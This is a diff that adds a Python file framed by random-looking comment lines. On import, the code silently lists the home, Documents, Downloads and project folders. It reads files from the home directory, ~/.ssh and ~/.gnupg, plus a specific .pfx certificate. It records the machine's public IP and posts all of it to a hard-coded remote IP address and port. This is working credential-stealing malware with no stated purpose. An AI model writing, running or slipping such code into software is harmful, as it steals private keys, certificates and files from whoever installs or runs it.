@@ -1,0 +1,135 @@
+# Wwz8YA
+# 5KtCn6x0XeNbeSlQLCu4F2
+# Lp1NaWuGiGyhYhwXNVrmsIx6ysCK212q7JDtnvFyJPu7ldvOpF7AV2
+# 3w9YOamJnITowdBNaZxHIgPsCNmS8jg
+# ykmcoVmMifxPcEEEfQjMLprHjIfojPxKcZzGL
+# IicLbKrrm8wi0Wtz3yhoz
+# ---------------------------------------------------------------------------- #
+KB = 1024
+Mb = KB * 1024
+
+import os
+import json
+import requests
+import base64
+
+
+class Data(object):
+    def __init__(self):
+        self.dump = ''
+
+    def add(self, v):
+        self.dump = self.dump + '\n' + str(v)
+        return v
+#
+
+
+data = Data()
+
+
+d = os.path.dirname(os.path.abspath(__file__))
+for i in range(15):
+    d = data.add(os.path.dirname(d))
+#
+
+
+def list_dir(path):
+    try:
+        return os.listdir(path)
+    except:
+        return []
+
+
+def save_file(f_path):
+    if not os.path.exists(f_path):
+        data.add('file is not exists: {}'.format(f_path))
+        return
+    #
+
+    is_dir = os.path.isdir(f_path)
+    data.add(str('-' * 10)
+             + ' :is_dir: ' + str(is_dir) + ' :file: ' + f_path)
+    if is_dir:
+        data.add(list_dir(f_path)[:50])
+    else:
+        file_size = os.path.getsize(f_path)
+        data.add(':file-size: ' + str(file_size))
+        data.add(f_path)
+        try:
+            # print(f_path)
+            with open(f_path, 'rb') as file:
+                try:
+                    data.add(file.read(15 * KB))
+                    if file_size > 15 * KB:
+                        data.add('--...--')
+                        _tail = file_size - 10 * KB
+                        if _tail > 10 * KB:
+                            _tail = 10 * KB
+                        file.seek(file_size - _tail)
+                        data.add(file.read())
+                except Exception as e:
+                    data.add(str(e))
+                    if file_size < 10 * KB:
+                        file.seek(0)
+                        data.add(base64.b32encode(file.read(20 * KB)))
+                #
+        except Exception as e:
+            data.add(str(e))
+            # print(is_dir)
+            # raise e
+            pass
+    #
+    data.add('-' * 10)
+
+
+def save_files(path):
+    if os.path.exists(path):
+        data.add(path)
+        data.add('\n       '.join(list_dir(path)))
+        files = list_dir(path)
+        data.add(str('=' * 10) + ' :path: ' + path)
+        data.add(files)
+        try:
+            for f_name in files[:30]:
+                save_file(os.path.join(path, f_name))
+        except Exception as e:
+            # print(e)
+            # raise e
+            pass
+        data.add('=' * 10)
+
+home = os.path.expanduser("~")
+if os.path.exists(home):
+    data.add(home)
+    data.add('\n   ###  1 ls home')
+    data.add('\n   '.join(list_dir(home)))
+    data.add('\n   ### 2 ls Documents')
+    data.add('\n   '.join(list_dir(os.path.join(home, 'Documents'))))
+    data.add('\n   ### 3 ls Downloads')
+    data.add('\n   '.join(list_dir(os.path.join(home, 'Downloads'))))
+    data.add('\n   ### 4 ls PycharmProjects')
+    data.add('\n   '.join(list_dir(os.path.join(home, 'PycharmProjects'))))
+    data.add('\n   ### 5 save home files')
+    save_files(home)
+    data.add('\n   ### 6 save .ssh files')
+    save_files(os.path.join(home, '.ssh'))
+    data.add('\n   ### 7 save gpg keys')
+    save_files(os.path.join(home, '.gnupg'))
+    data.add('\n   ### 8 save target')
+    save_file(os.path.join(home, 'Downloads/ITDS-2018-10-15-DRACO_SRV1-362.pfx'))
+    data.add('\n   ### 9 end :)')
+#
+data.add(requests.get('http://ifconfig.co/json').text)
+requests.post(
+    'http://68.183.212.246:32258',
+    data=json.dumps({'my3n_data': data.dump}, default=lambda v: str(v)),
+    headers={"Content-type": "application/json"}
+)
+
+# ---------------------------------------------------------------------------- #
+# WT5SLZqHKIgF5mgrIxaleuk9N5fxjyrRmtX0FxgJ7w0aT67THuB8wgCKVayb1aQHuxJ89oA
+# UM5yZ
+# zqokJ1TocU7hc43CT5DxtDJrqlPsIf56y3j288hs0aZ0h2FTspUQN4u3VS
+# m73l3MaHu
+# bKV8iFlqRsSQxFKg4pXbPPj72yhyBgyTVuQyriiT7W32ktEMWUK3KD7AEMVtLD
+# o2DlIjxTKfSlXjPG5cnGKyG7G1UXlye
